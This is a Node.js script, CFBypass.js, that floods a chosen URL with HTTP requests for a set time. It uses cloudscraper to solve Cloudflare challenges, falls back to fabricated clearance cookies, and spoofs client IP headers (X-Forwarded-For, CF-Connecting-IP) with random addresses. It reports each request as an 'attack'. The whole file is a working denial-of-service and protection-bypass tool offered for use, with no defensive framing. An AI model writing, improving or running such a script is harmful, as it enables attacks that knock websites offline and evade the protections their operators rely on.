var cloudscraper = require('cloudscraper');
var request = require('request');
var randomstring = require("randomstring");

var args = process.argv.slice(2);

randomByte = function() {
    return Math.round(Math.random() * 256);
}

if (process.argv.length <= 2) {
    console.log("Usage: node CFBypass.js <url> <time>");
    console.log("Usage: node CFBypass.js <http://example.com> <60>");
    process.exit(-1);
}

var url = process.argv[2];
var time = process.argv[3];

function attack() {
    // Cloudscraper options to ensure we get the challenge cookies
    var cloudscraperOptions = {
        url: url,
        method: 'GET',
        challengesToSolve: 3,
        decodeEmails: false,
        gzip: true
    };
    
    cloudscraper(cloudscraperOptions, function(error, response, body) {
        if (error) {
            console.log('Cloudscraper error:', error.message);
            return;
        }
        
        console.log('Cloudscraper status:', response.statusCode);
        
        // Extract cookies from cloudscraper response
        var cookies = '';
        
        // Method 1: Check if cloudscraper returns cookies in response
        if (response.request && response.request.headers && response.request.headers.cookie) {
            cookies = response.request.headers.cookie;
            console.log('Cookies from request headers:', cookies);
        }
        
        // Method 2: Check set-cookie headers
        if (response.headers['set-cookie']) {
            var setCookies = response.headers['set-cookie'];
            if (Array.isArray(setCookies)) {
                cookies = setCookies.map(function(cookie) {
                    return cookie.split(';')[0]; // Get only the key=value part
                }).join('; ');
            } else {
                cookies = setCookies.split(';')[0];
            }
            console.log('Cookies from set-cookie header:', cookies);
        }
        
        // Method 3: Try to get cookies from the cloudscraper instance
        if (cloudscraper.jar) {
            var jar = cloudscraper.jar();
            var jarCookies = jar.getCookies(url);
            if (jarCookies && jarCookies.length > 0) {
                cookies = jarCookies.map(function(cookie) {
                    return cookie.key + '=' + cookie.value;
                }).join('; ');
                console.log('Cookies from jar:', cookies);
            }
        }
        
        // If no cookies found, use default Cloudflare cookies
        if (!cookies) {
            cookies = 'cf_clearance=' + randomstring.generate(40) + '; __cf_bm=' + randomstring.generate(100);
            console.log('Using generated cookies:', cookies);
        }
        
        var useragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
        
        // If we have useragent from response, use it
        if (response.request && response.request.headers && response.request.headers['User-Agent']) {
            useragent = response.request.headers['User-Agent'];
        }
        
        var rand = randomstring.generate({
            length: 10,
            charset: 'abcdefghijklmnopqstuvwxyz0123456789'
        });
        
        var ip = randomByte() + '.' +
                randomByte() + '.' +
                randomByte() + '.' +
                randomByte();
        
        const options = {
            url: url,
            headers: {
                'User-Agent': useragent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cookie': cookies,
                'Origin': 'http://' + rand + '.com',
                'Referer': 'https://www.google.com/',
                'X-Forwarded-For': ip,
                'X-Real-IP': ip,
                'CF-Connecting-IP': ip
            },
            timeout: 10000,
            gzip: true
        };

        request(options, function(error, response, body) {
            if (error) {
                console.log('Request error:', error.message);
            } else {
                console.log('Attack successful. Status:', response.statusCode, 'IP:', ip);
            }
        });
    });
}

// Start with initial delay to get first set of cookies
setTimeout(() => {
    var int = setInterval(attack, 500); // 500ms interval to avoid being too aggressive
    
    // Stop after specified time
    setTimeout(() => {
        clearInterval(int);
        console.log('Attack finished after', time, 'seconds');
        process.exit(0);
    }, time * 1000);
}, 2000);

process.on('uncaughtException', function(err) {
    console.log('Uncaught Exception:', err.message);
});

process.on('unhandledRejection', function(err) {
    console.log('Unhandled Rejection:', err.message);
});
